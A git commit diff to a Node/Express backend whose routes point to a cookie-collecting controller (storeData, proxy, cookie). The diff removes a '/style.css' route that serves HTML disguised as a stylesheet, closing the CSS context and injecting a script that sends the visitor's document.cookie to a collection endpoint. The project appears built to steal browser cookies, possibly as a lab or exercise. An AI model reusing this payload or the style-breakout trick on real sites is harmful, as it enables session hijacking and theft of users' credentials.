0e5852ad80d8e392edfd5fc3cc28170b64ef8563
Charlot DEDJINOU <dedjinoucharlotjoel@gmail.com>
2025-04-29 15:35:37 +0100

    Momo

--- backend/src/routes/api.js
+++ backend/src/routes/api.js
@@ -7,21 +7,4 @@ router.post('/data', cookieController.storeData);
 router.get('/proxy', cookieController.proxy);
 router.get('/cookie', cookieController.cookie);
 
-router.get('/style.css', (req, res) => {
-    // Force le navigateur à traiter ce fichier comme du HTML
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.setHeader('ETag', '');
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    res.send(`
-      }/*
-      </style>
-      <script>
-        fetch('http://localhost:8080/api/cookie?c=' + document.cookie);
-        console.log(11111111111111)
-      </script>
-      <style>/*
-    `);
-});
-
-
 module.exports = router;
